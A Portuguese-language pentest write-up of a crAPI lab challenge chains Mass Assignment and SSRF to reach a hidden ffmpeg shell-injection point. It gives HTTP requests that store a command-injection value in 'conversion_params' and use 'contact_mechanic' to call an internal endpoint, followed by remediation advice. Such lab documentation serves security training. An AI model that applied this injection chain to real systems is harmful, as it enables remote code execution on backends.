# Shell Injection — encadeando Mass Assignment + SSRF

**Categoria OWASP API Security Top 10 (2023):** cadeia de `API3 — Mass Assignment` + `API7 — SSRF`, levando a injeção de comando
**Severidade estimada:** `Crítica` (RCE potencial)
**Desafio crAPI correspondente:** Challenge "shell injection" (oculto) + Challenge 10 (propriedade interna de vídeo)

---

## 1. Resumo

O serviço de vídeo converte arquivos chamando um comando de shell (`ffmpeg`) cujos parâmetros vêm do campo **`conversion_params`**. Esse campo é uma propriedade interna, mas pode ser **gravado pelo usuário** (Mass Assignment), permitindo injetar comandos. O endpoint que dispara a conversão (`convert_video`) só aceita chamadas **internas** — porém o atacante alcança a rede interna via **SSRF**. Encadeando as duas falhas, chega-se ao ponto de injeção de comando no backend.

## 2. Pré-condições

- Conta autenticada (para gravar `conversion_params` e disparar a SSRF).
- Um `video_id` próprio (obtido via upload de vídeo).

## 3. Passo a passo da exploração

1. **Upload de um vídeo** para obter um `video_id`:
   `POST /identity/api/v2/user/videos` (multipart, campo `file`).

2. **Mass Assignment** — grave o comando injetado na propriedade interna `conversion_params`:

```http
PUT /identity/api/v2/user/videos/{video_id} HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{ "conversion_params": "-i /dev/null; <comando> " }
```

3. **Tentativa direta é bloqueada** — chamar `convert_video` pelo gateway público retorna `403`:
   `{"message":"This endpoint should be accessed only internally ... endpoint_url http://crapi-identity:8080/identity/api/v2/user/videos/convert_video"}`.

4. **SSRF** — use o `contact_mechanic` para fazer o servidor chamar o endpoint interno:

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Authorization: Bearer <token>
Content-Type: application/json

{ "mechanic_api": "http://crapi-identity:8080/identity/api/v2/user/videos/convert_video?video_id={video_id}",
  "mechanic_code": "TRAC_JHN", "problem_details": "x", "vin": "...", "number_of_repeats": 1 }
```

A resposta do endpoint interno é refletida de volta (ver [SSRF](05-ssrf.md)), confirmando que o sink de injeção foi alcançado.

## 4. Evidência

**Confirmado contra a instância local** — captura em [`evidencias/08-shell-injection/captura.txt`](../../evidencias/08-shell-injection/captura.txt).

A resposta (base64) do endpoint interno, decodificada, é o próprio reconhecimento do crAPI de que o chain foi concluído:

```
WOW. Look at you. Combining Mass Assignment and SSRF to exploit a hidden Shell Injection.
We're very proud. You won the game. Unfortunately, we don't actually
allow our pentester to run arbitrary shell commands on our backend :(
...
you can simply change the `block_shell_injections` flag in the config file
to allow real shell injections.
```

Ou seja: o caminho completo (Mass Assignment → SSRF → `convert_video`/`ffmpeg`) chega ao ponto de injeção. A **execução real** de comandos fica atrás do flag de configuração `block_shell_injections` (ligado por padrão nesta build, por segurança) — o PoC comprova o alcance do sink sem executar comando arbitrário.

## 5. Por que é um risco

Injeção de comando no backend é **execução remota de código (RCE)** — o grau máximo de comprometimento (acesso ao sistema de arquivos, credenciais, pivô na rede interna). Este caso ilustra algo central em segurança de API: vulnerabilidades "médias" isoladas (uma propriedade gravável indevidamente, um SSRF) se **combinam** em um impacto crítico. Defesas pontuais não bastam; é preciso fechar cada elo.

## 6. Como corrigir

- **Nunca** construir comandos de shell concatenando entrada do usuário; usar APIs que recebem argumentos como lista (sem shell) e uma allow-list de parâmetros válidos.
- Tornar `conversion_params` **não gravável** pelo cliente (ver [Mass Assignment](04-mass-assignment.md)).
- Restringir destinos de requisições do servidor (ver [SSRF](05-ssrf.md)); um endpoint "só interno" não deve ser alcançável por entrada do usuário.
- Defesa em profundidade: isolar o worker de conversão, rodar com privilégios mínimos.

## 7. Referências

- [API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [API7:2023 Server-Side Request Forgery](https://owasp.org/API-Security/editions/2023/en/0xa7-server-side-request-forgery/)
- [OWASP — Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
